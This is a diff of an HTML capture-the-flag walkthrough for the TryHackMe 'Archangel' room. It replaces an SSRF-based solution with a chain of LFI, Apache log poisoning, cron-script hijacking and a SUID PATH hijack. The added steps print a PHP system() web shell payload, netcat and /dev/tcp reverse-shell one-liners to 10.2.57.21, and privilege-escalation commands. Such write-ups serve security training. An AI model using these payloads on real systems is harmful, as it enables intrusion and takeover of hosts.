@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Archangel: SSRF to local file read to cron privesc</title>
-  <meta name="description" content="A TryHackMe Archangel walkthrough: virtual-host discovery, chaining an SSRF into local file inclusion to read a Flask app's source, cracking a hashed password, and privesc via a world-writable cron script.">
+  <title>Archangel: LFI, log poisoning, and a PATH-hijacked SUID binary to root</title>
+  <meta name="description" content="A TryHackMe Archangel walkthrough: finding a hidden second virtual host, classic LFI combined with Apache log poisoning for code execution, pivoting via a cron-executed script, and a PATH hijack against a SUID backup binary.">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
   <link rel="stylesheet" href="../assets/style.css">
 </head>
@@ -12,17 +12,17 @@
 <div class="page">
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
-  <h1>Archangel: SSRF to local file read to cron privesc</h1>
-  <p class="dek">A hidden virtual host, an SSRF that reads arbitrary files through a Python web app's own image-fetching feature, a cracked password hash, and a root shell by abusing a cron job that runs as root but is writable by everyone.</p>
+  <h1>Archangel: LFI, log poisoning, and a PATH-hijacked SUID binary to root</h1>
+  <p class="dek">The real target isn't the site nmap and gobuster find first, it's a second virtual host hinted at by a support email address. Behind it: a textbook local file inclusion bug, turned into code execution by poisoning Apache's own access log, a cron-executed script that pivots to a second user, and a SUID backup binary that trusts an unqualified command.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Archangel</span>
-    <span class="pill">Category: Web / SSRF / Linux Privesc</span>
-    <span class="pill">Tools: Gobuster, Hashcat, Pspy</span>
+    <span class="pill">Category: Web / LFI</span>
+    <span class="pill">Tools: gobuster, Burp Suite, nc</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a web server hides more than its default page lets on. The job: find the real application behind a virtual host, turn a feature meant for fetching images into a way to read local files, and ride a careless cron job all the way to root.</p>
+    <p><strong>The setup:</strong> one web app is served on the box's IP directly, but it's a decorative front, the real vulnerable application lives on a second hostname that's never advertised anywhere except a contact email address in the first site's footer. The job: find it, then chain an LFI into full code execution and root.</p>
   </div>
 
   <section>
@@ -32,11 +32,21 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find the real site behind the virtual host</div>
-          <p>The default Apache page gives nothing away, but it references a domain name. Adding that to <code>/etc/hosts</code> and re-requesting the site reveals an entirely different application, a Python/Flask app for "Villain Hunters," not the stock Apache page at all.</p>
+          <div class="step-title">Scan, then find the real target hiding in plain sight</div>
+          <pre><code>nmap -sV -sC 10.10.133.36
+22/tcp open  ssh    OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http   Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Wavefire</code></pre>
+          <p>Gobuster against the site finds a few directories, none of them useful on their own:</p>
+          <pre><code>gobuster dir -u http://10.10.133.36 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t16 -q
+/images  (Status: 301)
+/pages   (Status: 301)
+/flags   (Status: 301)
+/layout  (Status: 301)</code></pre>
+          <p>The site itself ("WaveFire") is a generic template front, but its footer advertises a different company entirely, "Mafialive Solutions", with a contact address at <code>support@mafialive.thm</code>. That's a second hostname nowhere else mentioned.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Name-based virtual hosting means the same IP can serve completely different sites depending on the <code>Host</code> header. A default landing page is often a decoy, the real target is one DNS entry away.</p>
+            <p>A contact email domain that doesn't match the site you're looking at is a strong signal there's a second, unlinked virtual host on the same server. Browser extensions like Wappalyzer are useful here too, confirming the stack (Apache, jQuery, Ubuntu) without extra requests.</p>
           </div>
         </div>
       </div>
@@ -44,13 +54,21 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Spot the SSRF in an image loader</div>
-          <p>The site has a page that renders an image from a URL parameter, built to pull hero portraits from a remote path. Pointing that same parameter at a local file path instead of a URL:</p>
-          <pre><code>http://&lt;vhost&gt;/image?filename=/etc/passwd</code></pre>
-          <p>returns the file's contents rendered back as if it were an image, proving the parameter isn't validated as a URL at all, it's passed straight through to a file read.</p>
+          <div class="step-title">Add the second host and find its hidden test page</div>
+          <p>Adding <code>mafialive.thm</code> to <code>/etc/hosts</code> pointed at the same IP brings up the real target. Its <code>robots.txt</code> gives away exactly what it's trying to hide:</p>
+          <pre><code>User-agent: *
+Disallow: /test.php</code></pre>
+          <p>The page itself is blunt about what it is:</p>
+          <pre><code>Test Page. Not to be Deployed
+[Here is a button]
+Control is an illusion</code></pre>
+          <p>Its source reveals the link the button points to:</p>
+          <pre><code>&lt;a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"&gt;
+  &lt;button id="secret"&gt;Here is a button&lt;/button&gt;
+&lt;/a&gt;</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Any feature that fetches a resource from user-supplied input is a candidate for SSRF. Here it goes one step further: because the backend is a local file read dressed up as a URL fetch, it becomes a full Local File Inclusion primitive, not just a way to reach internal services.</p>
+            <p><code>robots.txt</code> disallowing a specific file is a direct pointer to it, and a <code>view=</code> parameter that takes a full filesystem path is about as explicit an LFI invitation as a web app can give.</p>
           </div>
         </div>
       </div>
@@ -58,13 +76,14 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Read the application's own source code</div>
-          <p>Since the app is a Flask project, its own source file is readable the same way:</p>
-          <pre><code>http://&lt;vhost&gt;/image?filename=/var/www/&lt;app&gt;/main.py</code></pre>
-          <p>The source reveals a hardcoded database path and, critically, how the app itself handles user records, pointing at a SQLite database file that's worth pulling the same way.</p>
+          <div class="step-title">Poison the Apache access log via the User-Agent header</div>
+          <p>LFI alone reads files, it doesn't execute code, unless the included file itself contains PHP. Apache's own access log is a file the server writes to on every request, including the User-Agent header verbatim. Sending a PHP payload as the User-Agent plants it directly in the log:</p>
+          <pre><code>GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1
+Host: mafialive.thm
+User-Agent: Mozilla/5.0 &lt;?php system($_GET['cmd']); ?&gt; (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>An LFI primitive isn't just useful for reading <code>/etc/passwd</code>, it's a way to read the application's own blueprint. Source code tells you exactly what file paths and credentials the app already trusts.</p>
+            <p>Log poisoning turns "read any file" into "execute any code" the moment the file being read is one the attacker can also write to, and a web server access log is written to on every single request, headers included, with no sanitization expected since it's meant to be read by humans, not interpreted.</p>
           </div>
         </div>
       </div>
@@ -72,11 +91,14 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Pull the database and crack a password</div>
-          <p>Fetching the SQLite file through the same LFI and opening it locally turns up a user table with a hashed password. Hashcat makes short work of it against a weak wordlist match, recovering a plaintext credential for SSH.</p>
+          <div class="step-title">Include the poisoned log and confirm code execution</div>
+          <p>Pointing the <code>view</code> parameter at the access log instead of the original file, four directories up via path traversal to escape the restricted base path, executes whatever PHP is sitting in it:</p>
+          <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../log/apache2/access.log&amp;cmd=id</code></pre>
+          <p>The poisoned User-Agent line in the log runs, and its output appears inline on the page:</p>
+          <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A database file is just another file to an unvalidated path parameter. Once it's local, it's no different from any other credential-cracking exercise, the hard part was getting it off the server in the first place.</p>
+            <p>Confirming the exact traversal depth (four <code>../</code> here) is what turns a theoretical LFI into a working one, the base include path isn't the filesystem root, so the traversal has to land precisely on the real log location.</p>
           </div>
         </div>
       </div>
@@ -84,12 +106,21 @@
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Watch for root running a world-writable script</div>
-          <p>With a shell as a low-privilege user, <code>pspy</code> (a process-spying tool that needs no special privileges) reveals a cron job running periodically as root, executing a script sitting in a directory the current user can write to.</p>
-          <pre><code>./pspy64</code></pre>
+          <div class="step-title">Turn the primitive into a real reverse shell</div>
+          <p>Rather than keep passing one-off commands through <code>&amp;cmd=</code>, the same RCE primitive can be driven straight from curl using a poisoned User-Agent that writes and runs a FIFO-based reverse shell:</p>
+          <pre><code>curl http://mafialive.thm -A "&lt;?php echo system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.57.21 4444 &gt;/tmp/f') ?&gt;"</code></pre>
+          <p>With a listener waiting, that lands an interactive shell:</p>
+          <pre><code>nc -lvnp 4444
+connect to [10.2.57.21] from (UNKNOWN) [10.10.26.73] 39326
+$ ls -la
+drwxr-xr-x 4 root root 4096 Nov 17  2020 ..
+-rw-r--r-- 1 1000 1000   59 Nov 19  2020 index.html
+-rw-r--r-- 1 1000 1000   40 Oct 31  2020 mrrobot.php
+-rw-r--r-- 1 root root   34 Nov 19  2020 robots.txt
+-rw-r--r-- 1 1000 1000  712 Nov 19  2020 test.php</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Static enumeration (checking crontab files) can miss jobs defined elsewhere, like systemd timers or jobs dropped by other scripts. Watching what actually executes over time catches what a one-time file listing won't.</p>
+            <p>This still rides the exact same log-poisoning primitive as the manual <code>&amp;cmd=</code> request, it's just a more useful payload: a persistent interactive shell instead of one command's output at a time.</p>
           </div>
         </div>
       </div>
@@ -97,11 +128,59 @@
       <div class="step">
         <div class="step-num">6</div>
         <div class="step-body">
-          <div class="step-title">Hijack the cron script for a root shell</div>
-          <p>Appending a reverse shell line to the script root's cron job executes, then waiting for the next scheduled run, lands a shell running as root the moment cron fires.</p>
+          <div class="step-title">Pivot to a second user via a writable, cron-run script</div>
+          <p>As <code>www-data</code>, <code>/opt/helloworld.sh</code> is world-writable and owned by a different user, <code>archangel</code>:</p>
+          <pre><code>echo "/bin/sh -i >& /dev/tcp/10.2.57.21/4445 0>&1" > /opt/helloworld.sh
+ls -la /opt/helloworld.sh
+-rwxrwxrwx 1 archangel archangel 44 Aug 17 11:59 /opt/helloworld.sh</code></pre>
+          <p>Overwriting it with a reverse shell payload and waiting for whatever runs it (a cron job, most likely, given the name and permissions) pays off:</p>
+          <pre><code>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.57.21 4445 >/tmp/f" > /opt/helloworld.sh
+
+nc -lvnp 4445
+connect to [10.2.57.21] from (UNKNOWN) [10.10.217.241] 60666
+$ id
+uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A script's permissions don't change based on who triggers it, cron runs it as whatever user owns the job, root in this case, regardless of who last edited the file. Writable-by-anyone plus run-by-root is a privilege escalation path almost every time.</p>
+            <p>A world-writable script owned by another user, especially one that looks like it's meant to run unattended, is a direct privilege pivot: whatever process executes it runs with that owner's permissions, and the attacker controls the script's contents.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">7</div>
+        <div class="step-body">
+          <div class="step-title">Find the SUID binary in archangel's own secret directory</div>
+          <pre><code>cd ~/secret
+ls -la
+-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
+-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt</code></pre>
+          <p><code>strings</code> on the binary shows exactly what it does when run:</p>
+          <pre><code>strings backup
+...
+cp /home/user/archangel/myfiles/* /opt/backupfiles</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The binary calls <code>cp</code> with no absolute path, trusting whatever the shell's PATH resolves it to. Any SUID binary that shells out to an unqualified command name is a PATH hijack waiting to happen.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">8</div>
+        <div class="step-body">
+          <div class="step-title">Hijack PATH and run the binary for root</div>
+          <p>Writing a fake <code>cp</code> that's really a shell, making it executable, and prepending the current directory to <code>PATH</code> means the next unqualified <code>cp</code> call resolves to it instead of the real one:</p>
+          <pre><code>echo "/bin/bash" > cp
+chmod +x cp
+export PATH=$PWD:$PATH</code></pre>
+          <p>Running the SUID binary now runs the fake <code>cp</code>, as root:</p>
+          <pre><code>./backup
+root@ubuntu:~/secret# whoami
+root</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>SUID means the binary executes with the file owner's privileges, root, regardless of who runs it. Since it never hardcodes <code>cp</code>'s full path, whatever <code>cp</code> resolves to under the calling user's PATH is what actually runs, with root's permissions attached.</p>
           </div>
         </div>
       </div>
@@ -111,34 +190,41 @@
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>Apache default page &rarr; hidden vhost found via /etc/hosts
-  &rarr; Flask app's image loader takes a raw file path (SSRF / LFI)
-       &rarr; app's own main.py read, reveals the SQLite DB path
-            &rarr; DB pulled, password hash cracked offline
-                 &rarr; SSH in as a low-privilege user
-                      &rarr; pspy catches a root cron job on a writable script
-                           &rarr; script hijacked, root shell on next run</code></pre>
+    <pre><code>Wavefire (decorative front site)
+  &rarr; contact email reveals a second hostname: mafialive.thm
+       &rarr; robots.txt: /test.php, an LFI-vulnerable view= parameter
+            &rarr; User-Agent header poisons the Apache access log
+                 &rarr; LFI includes the poisoned log: RCE as www-data
+                      &rarr; reverse shell as www-data
+                           &rarr; /opt/helloworld.sh: writable, cron-run as archangel
+                                &rarr; reverse shell as archangel
+                                     &rarr; ~/secret/backup: SUID, calls unqualified cp
+                                          &rarr; PATH hijack &rarr; root</code></pre>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">Virtual hosts hide real attack surface</div>
-        <p>A default Apache page proves nothing about what else the server serves. Always check for named virtual hosts before concluding a target is uninteresting.</p>
+        <div class="skill-title">The real target isn't always the obvious one</div>
+        <p>The site on the box's bare IP was a decoy. The actual vulnerable application only surfaced through a contact email address pointing at a different domain entirely.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">An image fetcher is a file-read primitive in disguise</div>
-        <p>Any "load a resource from this parameter" feature deserves a local-path test, not just a remote-URL test.</p>
+        <div class="skill-title">LFI plus a writable log is RCE</div>
+        <p>A file-read bug becomes code execution the moment the included file can also be influenced by the attacker, and a web server's own access log, written on every request, is one of the most reliable ways to do that.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Watch what runs, don't just read what's scheduled</div>
-        <p>pspy-style process monitoring catches privileged jobs that static crontab enumeration can miss entirely.</p>
+        <div class="skill-title">World-writable scripts owned by another user are a privilege pivot</div>
+        <p>Whatever runs that script, a cron job in this case, runs it with the owner's permissions. Controlling the contents is controlling that execution.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Unqualified commands in SUID binaries are still a classic</div>
+        <p><code>strings</code> on any SUID binary is worth running before assuming it needs a novel exploit. A bare command name with no path is often all it takes.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via SSRF/LFI chaining and cron privilege escalation</footer>
+  <footer>tryhackme.com &middot; solved via virtual host discovery, LFI/log poisoning, and a PATH hijack</footer>
 
 </div>
 </body>
